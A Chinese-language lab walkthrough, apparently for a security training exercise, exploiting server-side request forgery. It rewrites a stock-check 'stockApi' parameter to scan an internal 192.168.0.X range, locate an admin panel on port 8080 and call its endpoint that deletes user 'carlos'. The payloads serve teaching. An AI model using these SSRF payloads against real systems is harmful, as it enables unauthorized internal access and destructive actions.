# 实验：针对其他后端系统的基础 SSRF

本实验具有一个库存检查功能，该功能会从内部系统获取数据。

为了解决本实验，请使用库存检查功能扫描内部 `192.168.0.X` 网段，寻找位于端口 `8080` 上的管理员界面，然后利用它删除用户 `carlos`。

## 步骤

探测
- 访问商品详情页面后，使用库存检查功能
    ```http
    POST /product/stock HTTP/2

    stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
    ```
    - 请求体参数值中存在 URL 格式


探测 URL 参数值内网连接
- `stockApi=http://192.168.0.1:8080`
    - 服务器响应 400
        `"Missing parameter"`

- `stockApi=http://192.168.0.2:8080`
    - 服务器响应 500
        `Could not connect to external stock check service`

发送到攻击器进行爆破
- 设置数字爆破，直到 255
    `stockApi=http://192.168.0.§2§:8080`
- 其中存在特殊响应 404
    - 请求
        `stockApi=http://192.168.0.34:8080`
    - 响应
        `"Not Found"`


发送兴趣 URL 到重复器探测
- 尝试访问管理员页面
    `stockApi=http://192.168.0.34:8080/admin`
    - 服务器响应
        ```html
        <div>
            <span>carlos - </span>
            <a href="/http://192.168.0.34:8080/admin/delete?username=carlos">Delete</a>
        </div>
        ```
        - 显示管理页面以及删除端点

- 请求删除端点后执行操作
